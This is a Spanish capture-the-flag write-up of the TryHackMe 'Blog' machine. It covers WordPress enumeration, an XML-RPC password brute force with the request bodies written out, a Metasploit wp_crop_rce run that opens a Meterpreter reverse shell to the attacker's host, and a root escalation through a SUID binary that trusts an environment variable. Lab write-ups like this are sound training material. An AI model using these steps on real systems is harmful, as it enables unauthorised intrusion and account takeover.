---
title: "TryHackMe: Blog"
date: 2026-07-08
category: "TryHackMe"
order: 8
tags: ["tryhackme", "wordpress", "xmlrpc", "privesc", "reverse-engineering"]
layout: layouts/writeup.njk
permalink: /writeups/thm-blog.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.240.0
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux
```

### Enumeración web con Gobuster

```bash
gobuster dir -u http://10.10.240.0 -w /usr/share/wordlists/dirb/common.txt
...
/admin                (Status: 302) [--> http://blog.thm/wp-admin/]
/atom                 (Status: 301) [--> http://10.10.240.0/feed/atom/]
/robots.txt           (Status: 200)
/wp-admin             (Status: 301)
/wp-content           (Status: 301)
/wp-includes          (Status: 301)
/xmlrpc.php           (Status: 405)
```

`/admin` redirige a `wp-admin` — confirma que el CMS es **WordPress**.

### El feed Atom filtra usuarios y contenido

`/atom` descarga un feed XML con las entradas del blog. Revisándolo se identifican dos autores: **Karen Wheeler** y **Billy Joel**, y un dominio virtual `blog.thm` (agregado a `/etc/hosts` para poder navegarlo).

Un segundo archivo atom descargado desde `blog.thm/wp-atom.php` resultó ser prácticamente idéntico al primero — comparado con el **Comparer de Burp Suite** para confirmarlo línea por línea, sin diferencias relevantes más allá del nombre.

---

## WPScan

```bash
docker run -it --rm wpscanteam/wpscan --url http://10.10.240.0 --api-token <token>
...
[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06)
| [!] 70 vulnerabilities identified
[+] Upload directory has listing enabled
[+] XML-RPC seems to be enabled
[+] The external WP-Cron seems to be enabled
```

WPScan reportó **70 vulnerabilidades conocidas** para WordPress 5.0 (desde bypasses de tipo de post hasta RCE autenticado) — un recordatorio de que correr un CMS sin actualizar por años acumula una superficie de ataque enorme. En vez de perseguir cada CVE individualmente, el siguiente paso fue enumerar usuarios reales para intentar autenticarse.

### Enumeración de usuarios

```bash
docker run -it --rm wpscanteam/wpscan --url http://10.10.20.202 --enumerate u --api-token <token>
...
[+] bjoel
[+] kwheel
```

**Rutas importantes en WordPress para reconocimiento:**

```
/wp-json/wp/v2/users
/wp-login.php
/wp-admin/wp-login.php
/wp-registration.php
/xmlrpc.php
/wp-cron.php
```

---

## Ataque de fuerza bruta

### Con WPScan (vía XML-RPC)

```bash
docker run -it --rm -v /home/phctr/Documents/Blog:/Blog wpscanteam/wpscan --url http://10.10.74.139 -U kwheel -P /Blog/passwords.txt
...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1
```

### Réplica manual con Burp Suite (para entender el mecanismo)

`xmlrpc.php` es una interfaz XML-RPC que WordPress expone por defecto — una fuente clásica de misconfiguration. Pasos:

1. Interceptar el tráfico hacia `xmlrpc.php`.
2. Cambiar a método POST en Burp Repeater.
3. Enviar `system.listMethods` para ver qué métodos están disponibles:

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

4. Si aparecen métodos como `wp.getUsersBlogs`, `wp.getCategories` o `metaWeblog.getUsersBlogs`, es muy probable que se pueda hacer fuerza bruta a través de ellos.
5. Se construye una petición de prueba de login usando `wp.getUsersBlogs`:

```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```

6. Se manda esta petición a **Burp Intruder**, cargando el usuario conocido (`kwheel`) fijo y una wordlist de contraseñas en el segundo parámetro. La respuesta que difiere del resto (por tamaño o contenido) revela la contraseña correcta — confirmando `cutiepie1`, la misma que encontró WPScan.

---

## Explotación — RCE vía Metasploit

Con WordPress 5.0 confirmado y credenciales válidas, se buscó el CVE correspondiente y apareció el módulo de Metasploit `wp_crop_rce` (WordPress 3.7–5.0, excepto 4.9.9 — Authenticated Code Execution vía la función de recorte de imágenes).

```bash
msf exploit(multi/http/wp_crop_rce) >> set lhost 10.13.51.230
msf exploit(multi/http/wp_crop_rce) >> run

[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (40004 bytes) to 10.10.74.139
[*] Meterpreter session 1 opened

(Meterpreter 1)(/var/www/wordpress) > shell
www-data@blog:/var/www/wordpress$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Escalada de privilegios

### Buscando binarios SUID

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Entre los binarios SUID estándar (`passwd`, `sudo`, `mount`, etc.) apareció uno que no pertenece al sistema base:

```
-rwsr-sr-x   1 root     root     8432 May 26  2020 /usr/sbin/checker
```

### Analizando el binario custom

Se descargó con Meterpreter y se identificó como un ELF de 64 bits:

```bash
(Meterpreter 1) > download /usr/sbin/checker
file checker
checker: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Sin Ghidra instalado localmente (evitando el proceso de instalar JDK + Ghidra por tiempo), se usó un **decompilador online** para inspeccionar el binario. El pseudocódigo mostró que el programa lee una variable de entorno: si su valor indica "admin", el chequeo pasa; si no, se rechaza.

### Bypass: variable de entorno

```bash
(Meterpreter 1) > shell
export admin=1
/usr/sbin/checker
whoami
root
```

Setear la variable de entorno `admin=1` antes de ejecutar el binario SUID fue suficiente para obtener una shell como root — el binario confiaba ciegamente en una variable de entorno controlable por cualquier usuario, sin ninguna verificación real de identidad.

---

## Flags

```bash
find / -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt

cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```

---

## Lecciones aprendidas

- Un feed RSS/Atom expuesto puede filtrar nombres de usuario reales sin que el atacante toque el panel de admin.
- `xmlrpc.php` habilitado en WordPress es una superficie de ataque clásica para fuerza bruta, incluso con protecciones de login normales activas.
- Un CVE de RCE autenticado (como `wp_crop_rce`) puede ser tan simple como tener credenciales válidas de cualquier usuario, no necesariamente admin.
- Un binario SUID personalizado que confía en una variable de entorno sin validarla contra un mecanismo real de autenticación es una escalada de privilegios trivial una vez identificado.
- Cuando no hay tiempo para instalar herramientas pesadas como Ghidra, un decompilador online puede ser suficiente para un análisis rápido de un binario pequeño.
